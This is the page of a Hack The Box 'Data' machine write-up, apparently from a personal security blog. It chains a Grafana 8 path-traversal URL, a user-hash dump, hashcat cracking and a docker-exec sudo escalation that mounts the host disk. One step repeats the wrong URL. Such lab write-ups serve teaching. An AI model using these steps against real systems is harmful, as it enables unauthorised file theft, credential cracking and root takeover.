@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="HTB Data Machine Walkthrough - Complete Penetration Testing GuideIntroductionWelcome to this comprehensive walkthrough of the Data machine from Hack The Box (HTB). In this detailed writeup, we’ll expl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Data">
+<meta property="og:url" content="https://panosoikogr.github.io/2025/10/22/HTB-Data/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="HTB Data Machine Walkthrough - Complete Penetration Testing GuideIntroductionWelcome to this comprehensive walkthrough of the Data machine from Hack The Box (HTB). In this detailed writeup, we’ll expl">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-10-22T19:15:12.000Z">
+<meta property="article:modified_time" content="2025-10-22T19:16:09.434Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="Hack The Box">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HTB-Data</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/10/21/HTB-Redelegate/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/10/22/HTB-Data/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/10/22/HTB-Data/&text=HTB-Data"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/10/22/HTB-Data/&title=HTB-Data"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/10/22/HTB-Data/&is_video=false&description=HTB-Data"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB-Data&body=Check out this article: https://panosoikogr.github.io/2025/10/22/HTB-Data/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/10/22/HTB-Data/&title=HTB-Data"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/10/22/HTB-Data/&title=HTB-Data"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/10/22/HTB-Data/&title=HTB-Data"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/10/22/HTB-Data/&title=HTB-Data"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/10/22/HTB-Data/&name=HTB-Data&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/10/22/HTB-Data/&t=HTB-Data"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTB-Data-Machine-Walkthrough-Complete-Penetration-Testing-Guide"><span class="toc-number">1.</span> <span class="toc-text">HTB Data Machine Walkthrough - Complete Penetration Testing Guide</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Reconnaissance"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Reconnaissance</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-Results"><span class="toc-number">1.2.1.</span> <span class="toc-text">Nmap Scan Results</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Grafana-8-Vulnerability-Discovery"><span class="toc-number">1.3.</span> <span class="toc-text">Grafana 8 Vulnerability Discovery</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Identifying-the-Service"><span class="toc-number">1.3.1.</span> <span class="toc-text">Identifying the Service</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Local-File-Inclusion-LFI-Exploitation"><span class="toc-number">1.3.2.</span> <span class="toc-text">Local File Inclusion (LFI) Exploitation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Configuration-File-Analysis"><span class="toc-number">1.4.</span> <span class="toc-text">Configuration File Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Extracting-Grafana-Configuration"><span class="toc-number">1.4.1.</span> <span class="toc-text">Extracting Grafana Configuration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Downloading-the-Database"><span class="toc-number">1.4.2.</span> <span class="toc-text">Downloading the Database</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Database-Analysis-and-Credential-Extraction"><span class="toc-number">1.5.</span> <span class="toc-text">Database Analysis and Credential Extraction</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Opening-the-SQLite-Database"><span class="toc-number">1.5.1.</span> <span class="toc-text">Opening the SQLite Database</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dumping-User-Credentials"><span class="toc-number">1.5.2.</span> <span class="toc-text">Dumping User Credentials</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Password-Hash-Cracking"><span class="toc-number">1.6.</span> <span class="toc-text">Password Hash Cracking</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Converting-Hash-Format"><span class="toc-number">1.6.1.</span> <span class="toc-text">Converting Hash Format</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cracking-with-Hashcat"><span class="toc-number">1.6.2.</span> <span class="toc-text">Cracking with Hashcat</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access-via-SSH"><span class="toc-number">1.7.</span> <span class="toc-text">Initial Access via SSH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">1.8.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Sudo-Privileges-Enumeration"><span class="toc-number">1.8.1.</span> <span class="toc-text">Sudo Privileges Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Identifying-the-Root-Filesystem"><span class="toc-number">1.8.2.</span> <span class="toc-text">Identifying the Root Filesystem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Finding-the-Docker-Container"><span class="toc-number">1.8.3.</span> <span class="toc-text">Finding the Docker Container</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gaining-Root-Shell-in-Docker"><span class="toc-number">1.8.4.</span> <span class="toc-text">Gaining Root Shell in Docker</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mounting-the-Host-Filesystem"><span class="toc-number">1.8.5.</span> <span class="toc-text">Mounting the Host Filesystem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Capturing-the-Root-Flag"><span class="toc-number">1.8.6.</span> <span class="toc-text">Capturing the Root Flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.9.</span> <span class="toc-text">Conclusion</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HTB-Data
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-10-22T19:15:12.000Z" class="dt-published" itemprop="datePublished">2025-10-22</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Hack-The-Box/" rel="tag">Hack The Box</a>, <a class="p-category" href="/tags/Linux/" rel="tag">Linux</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="HTB-Data-Machine-Walkthrough-Complete-Penetration-Testing-Guide"><a href="#HTB-Data-Machine-Walkthrough-Complete-Penetration-Testing-Guide" class="headerlink" title="HTB Data Machine Walkthrough - Complete Penetration Testing Guide"></a>HTB Data Machine Walkthrough - Complete Penetration Testing Guide</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Welcome to this comprehensive walkthrough of the <strong>Data machine from Hack The Box (HTB)</strong>. In this detailed writeup, we’ll explore the complete penetration testing methodology used to compromise this Linux-based target. This HTB Data walkthrough demonstrates several critical vulnerabilities including <strong>Grafana Local File Inclusion (LFI)</strong>, credential extraction, hash cracking with <strong>Hashcat</strong>, and <strong>Docker privilege escalation</strong>.</p>
+<p>Throughout this HTB writeup, we’ll be using industry-standard tools including <strong>Nmap</strong> for reconnaissance, <strong>SQLite</strong> for database analysis, <strong>Hashcat</strong> for password cracking, and various Docker commands for privilege escalation. Whether you’re preparing for the OSCP, studying for cybersecurity certifications, or simply looking to improve your pentesting skills, this step-by-step guide will walk you through each phase of the exploitation process.</p>
+<p>Let’s dive into this HTB Data machine walkthrough and break down the attack chain that leads to complete system compromise.</p>
+<hr>
+<h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><h3 id="Nmap-Scan-Results"><a href="#Nmap-Scan-Results" class="headerlink" title="Nmap Scan Results"></a>Nmap Scan Results</h3><p>We begin our enumeration with an Nmap scan that reveals two open ports:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 </span><br><span class="line">3000/tcp open  ppp?    syn-ack ttl 62</span><br></pre></td></tr></table></figure>
+
+<p>Port 22 is running SSH, while port 3000 hosts an interesting service that warrants further investigation.</p>
+<hr>
+<h2 id="Grafana-8-Vulnerability-Discovery"><a href="#Grafana-8-Vulnerability-Discovery" class="headerlink" title="Grafana 8 Vulnerability Discovery"></a>Grafana 8 Vulnerability Discovery</h2><h3 id="Identifying-the-Service"><a href="#Identifying-the-Service" class="headerlink" title="Identifying the Service"></a>Identifying the Service</h3><p>Upon accessing port 3000, we discover that it’s running <strong>Grafana version 8</strong>. This is a significant finding, as Grafana 8 has known vulnerabilities.</p>
+<h3 id="Local-File-Inclusion-LFI-Exploitation"><a href="#Local-File-Inclusion-LFI-Exploitation" class="headerlink" title="Local File Inclusion (LFI) Exploitation"></a>Local File Inclusion (LFI) Exploitation</h3><p>Through research and referencing a bug bounty report (<a target="_blank" rel="noopener" href="https://hackerone.com/reports/1427086">https://hackerone.com/reports/1427086</a>), we identify a <strong>Local File Inclusion (LFI) vulnerability</strong> that allows us to read arbitrary files from the server.</p>
+<p>We can exploit this vulnerability using the following path traversal technique to read <code>/etc/passwd</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.129.78.166:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Configuration-File-Analysis"><a href="#Configuration-File-Analysis" class="headerlink" title="Configuration File Analysis"></a>Configuration File Analysis</h2><h3 id="Extracting-Grafana-Configuration"><a href="#Extracting-Grafana-Configuration" class="headerlink" title="Extracting Grafana Configuration"></a>Extracting Grafana Configuration</h3><p>Next, we leverage the LFI vulnerability to access Grafana’s default configuration file:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.129.78.166:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fshare%2Fgrafana%2Fconf%2Fdefaults.ini</span><br></pre></td></tr></table></figure>
+
+<p>Within the configuration file, we find database credentials:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Either &quot;mysql&quot;, &quot;postgres&quot; or &quot;sqlite3&quot;, it&#x27;s your choice</span><br><span class="line">type = sqlite3</span><br><span class="line">host = 127.0.0.1:3306</span><br><span class="line">name = grafana</span><br><span class="line">user = root</span><br><span class="line"># If the password contains # or ; you have to wrap it with triple quotes. Ex &quot;&quot;&quot;#password;&quot;&quot;&quot;</span><br><span class="line">password =</span><br><span class="line"># Use either URL or the previous fields to configure the database</span><br><span class="line"># Example: mysql://user:secret@host:port/database</span><br><span class="line">url =</span><br></pre></td></tr></table></figure>
+
+<h3 id="Downloading-the-Database"><a href="#Downloading-the-Database" class="headerlink" title="Downloading the Database"></a>Downloading the Database</h3><p>We can also download the SQLite database file using the same LFI vulnerability:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.129.78.166:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fshare%2Fgrafana%2Fconf%2Fdefaults.ini</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Database-Analysis-and-Credential-Extraction"><a href="#Database-Analysis-and-Credential-Extraction" class="headerlink" title="Database Analysis and Credential Extraction"></a>Database Analysis and Credential Extraction</h2><h3 id="Opening-the-SQLite-Database"><a href="#Opening-the-SQLite-Database" class="headerlink" title="Opening the SQLite Database"></a>Opening the SQLite Database</h3><p>With the database file downloaded, we can examine its contents using SQLite3:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlite3 grafana.db</span><br></pre></td></tr></table></figure>
+
+<h3 id="Dumping-User-Credentials"><a href="#Dumping-User-Credentials" class="headerlink" title="Dumping User Credentials"></a>Dumping User Credentials</h3><p>We query the user table to extract stored credentials:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlite&gt; SELECT * FROM user;</span><br><span class="line">1|0|admin|admin@localhost||7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S|hLLY6QQ4Y6||1|1|0||2022-01-23 12:48:04|2022-01-23 12:48:50|0|2022-01-23 12:48:50|0</span><br><span class="line">2|0|boris|boris@data.vl|boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl|mYl941ma8w||1|0|0||2022-01-23 12:49:11|2022-01-23 12:49:11|0|2012-01-23 12:49:11|0</span><br></pre></td></tr></table></figure>
+
+<p>We now have two users: <strong>admin</strong> and <strong>boris</strong>, along with their hashed passwords and salts.</p>
+<hr>
+<h2 id="Password-Hash-Cracking"><a href="#Password-Hash-Cracking" class="headerlink" title="Password Hash Cracking"></a>Password Hash Cracking</h2><h3 id="Converting-Hash-Format"><a href="#Converting-Hash-Format" class="headerlink" title="Converting Hash Format"></a>Converting Hash Format</h3><p>To make the hashes compatible with Hashcat, we need to convert them using <strong>grafana2hashcat</strong> (<a target="_blank" rel="noopener" href="https://github.com/iamaldi/grafana2hashcat">https://github.com/iamaldi/grafana2hashcat</a>).</p>
+<p>The hash format should include the salt:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8,LCBhdtJWjl</span><br></pre></td></tr></table></figure>
+
+<p>We run the conversion tool:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 grafana2hashcat.py hash</span><br></pre></td></tr></table></figure>
+
+<p>The tool returns the hash in SHA-256 format, which is compatible with Hashcat.</p>
+<h3 id="Cracking-with-Hashcat"><a href="#Cracking-with-Hashcat" class="headerlink" title="Cracking with Hashcat"></a>Cracking with Hashcat</h3><p>Now we can crack the hash using Hashcat with the rockyou.txt wordlist:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 10900 hash2 /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>Success! The password is cracked:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:beautiful1</span><br></pre></td></tr></table></figure>
+
+<p><strong>Boris’s password is: beautiful1</strong></p>
+<hr>
+<h2 id="Initial-Access-via-SSH"><a href="#Initial-Access-via-SSH" class="headerlink" title="Initial Access via SSH"></a>Initial Access via SSH</h2><p>With valid credentials in hand, we can now establish an SSH connection to the target machine:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh boris@10.129.78.166</span><br></pre></td></tr></table></figure>
+
+<p>We now have user-level access to the system as boris.</p>
+<hr>
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="Sudo-Privileges-Enumeration"><a href="#Sudo-Privileges-Enumeration" class="headerlink" title="Sudo Privileges Enumeration"></a>Sudo Privileges Enumeration</h3><p>After gaining initial access, we check for sudo privileges:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for boris on localhost:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line">User boris may run the following commands on localhost:</span><br><span class="line">    (root) NOPASSWD: /snap/bin/docker exec *</span><br></pre></td></tr></table></figure>
+
+<p>Excellent! Boris can run <code>docker exec</code> as root without a password. This is a critical privilege escalation vector.</p>
+<h3 id="Identifying-the-Root-Filesystem"><a href="#Identifying-the-Root-Filesystem" class="headerlink" title="Identifying the Root Filesystem"></a>Identifying the Root Filesystem</h3><p>We run the <code>mount</code> command to identify mounted filesystems:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/dev/sda1 on / type ext4 (rw,relatime)</span><br></pre></td></tr></table></figure>
+
+<p>The root filesystem is mounted on <code>/dev/sda1</code>, which will be important for our privilege escalation.</p>
+<h3 id="Finding-the-Docker-Container"><a href="#Finding-the-Docker-Container" class="headerlink" title="Finding the Docker Container"></a>Finding the Docker Container</h3><p>We need to identify the running Docker container:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps auxww | grep docker</span><br></pre></td></tr></table></figure>
+
+<p>This command reveals the container ID that we’ll use in the next step.</p>
+<h3 id="Gaining-Root-Shell-in-Docker"><a href="#Gaining-Root-Shell-in-Docker" class="headerlink" title="Gaining Root Shell in Docker"></a>Gaining Root Shell in Docker</h3><p>Now we execute a bash shell inside the Docker container as root:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker exec -it --user root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 bash</span><br></pre></td></tr></table></figure>
+
+<h3 id="Mounting-the-Host-Filesystem"><a href="#Mounting-the-Host-Filesystem" class="headerlink" title="Mounting the Host Filesystem"></a>Mounting the Host Filesystem</h3><p>Once inside the container as root, we mount the host’s root filesystem:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/sda1 /mnt/</span><br></pre></td></tr></table></figure>
+
+<p>This mounts the entire host filesystem to <code>/mnt/</code> within the container, giving us access to all files on the main machine.</p>
+<h3 id="Capturing-the-Root-Flag"><a href="#Capturing-the-Root-Flag" class="headerlink" title="Capturing the Root Flag"></a>Capturing the Root Flag</h3><p>Finally, we can read the root flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /mnt/root/root.txt</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>This HTB Data walkthrough demonstrated a complete penetration testing methodology from initial reconnaissance to root access. The attack chain involved:</p>
+<ol>
+<li><strong>Reconnaissance</strong> - Nmap scanning to identify open services</li>
+<li><strong>Vulnerability Discovery</strong> - Identifying Grafana 8 LFI vulnerability</li>
+<li><strong>Information Gathering</strong> - Extracting configuration files and database</li>
+<li><strong>Credential Extraction</strong> - Dumping user hashes from SQLite database</li>
+<li><strong>Password Cracking</strong> - Using Hashcat to crack password hashes</li>
+<li><strong>Initial Access</strong> - SSH login with cracked credentials</li>
+<li><strong>Privilege Escalation</strong> - Exploiting Docker sudo permissions to gain root</li>
+</ol>
+<p>This machine highlights the importance of proper access controls, keeping software up-to-date, and the dangers of misconfigured Docker permissions. The combination of an LFI vulnerability, weak password storage, and overly permissive sudo rules created a clear path to complete system compromise.</p>
+<p>I hope this HTB writeup helped you understand the exploitation process. Happy hacking, and remember to always practice ethically!</p>
+<hr>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTB-Data-Machine-Walkthrough-Complete-Penetration-Testing-Guide"><span class="toc-number">1.</span> <span class="toc-text">HTB Data Machine Walkthrough - Complete Penetration Testing Guide</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Reconnaissance"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Reconnaissance</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-Results"><span class="toc-number">1.2.1.</span> <span class="toc-text">Nmap Scan Results</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Grafana-8-Vulnerability-Discovery"><span class="toc-number">1.3.</span> <span class="toc-text">Grafana 8 Vulnerability Discovery</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Identifying-the-Service"><span class="toc-number">1.3.1.</span> <span class="toc-text">Identifying the Service</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Local-File-Inclusion-LFI-Exploitation"><span class="toc-number">1.3.2.</span> <span class="toc-text">Local File Inclusion (LFI) Exploitation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Configuration-File-Analysis"><span class="toc-number">1.4.</span> <span class="toc-text">Configuration File Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Extracting-Grafana-Configuration"><span class="toc-number">1.4.1.</span> <span class="toc-text">Extracting Grafana Configuration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Downloading-the-Database"><span class="toc-number">1.4.2.</span> <span class="toc-text">Downloading the Database</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Database-Analysis-and-Credential-Extraction"><span class="toc-number">1.5.</span> <span class="toc-text">Database Analysis and Credential Extraction</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Opening-the-SQLite-Database"><span class="toc-number">1.5.1.</span> <span class="toc-text">Opening the SQLite Database</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dumping-User-Credentials"><span class="toc-number">1.5.2.</span> <span class="toc-text">Dumping User Credentials</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Password-Hash-Cracking"><span class="toc-number">1.6.</span> <span class="toc-text">Password Hash Cracking</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Converting-Hash-Format"><span class="toc-number">1.6.1.</span> <span class="toc-text">Converting Hash Format</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cracking-with-Hashcat"><span class="toc-number">1.6.2.</span> <span class="toc-text">Cracking with Hashcat</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access-via-SSH"><span class="toc-number">1.7.</span> <span class="toc-text">Initial Access via 